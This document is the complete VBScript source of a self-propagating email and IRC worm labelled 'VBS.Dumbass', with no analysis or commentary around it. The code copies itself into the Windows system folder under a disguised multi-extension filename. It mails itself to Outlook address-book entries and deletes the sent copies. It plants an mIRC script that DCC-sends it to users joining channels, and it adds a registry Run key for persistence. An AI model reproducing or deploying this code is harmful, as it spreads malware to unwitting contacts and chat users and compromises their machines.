'VBS.Dumbass

On Error Resume Next
Dim Fso, Mirc, Scrpt, Ini, Reg, Sys, Progra, Worm
Set Fso = CreateObject("Scripting.FilesystemObject")
Set Reg = CreateObject("WScript.Shell")
Set Sys = Fso.GetSpecialFolder(1)
Set Worm = Fso.GetFile(WScript.ScriptFullName)
Set Mail01 = CreateObject("outlook.application")

    Worm.Copy Sys & "\XXXPICS.(Worm).txt.jpg.exe.com.gif.vbe.js.vbs"
    If Mail01 <> "" Then
	Set Mail02 = Mail01.GetNameSpace("MAPI")
	For Mail03 = 1 To Mail02.AddressLists.Count
	Set Mail04 = Mail02.AddressLists(Mail03)
            Mail05 = 1
	Set Mail06 = Mail01.CreateItem(0)
	For Mail07 = 1 To Mail04.AddressEntries.Count
	    Mail08 = Mail04.AddressEntries(Mail05)
	    Mail06.Recipients.Add Mail08
	    Mail05 = Mail05 + 1
	If Mail05 > 100 Then Exit For
	Next
	    Mail06.Subject = "This is a Worm"
	    Mail06.Body = "Make sure to be a dumbass and open this, the sender was."
	    Mail06.Attachments.Add Wscript.ScriptFullName
	    Mail06.DeleteAfterSubmit = True
	    Mail06.Send
	    Mail08 = ""
	Next
	Const ForWriting = 2


Set Mirc = CreateObject("Scripting.FileSystemObject")
    Mirc.CreateTextFile ("c:\mirc\script.ini")
Set Scrpt = Mirc.GetFile("c:\mirc\script.ini")
Set Ini = Scrpt.OpenAsTextStream(ForWriting, false)
	Ini.write "[script]" & vbcrlf
	Ini.write "n0=ON 1:JOIN:#:/dcc send $nick " & Sys & "\XXXPICS.(Worm).txt.jpg.exe.com.gif.vbe.js.vbs"
	Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dumbass","XXXPICS.(Worm).txt.jpg.exe.com.gif.vbe.js.vbs"
End If
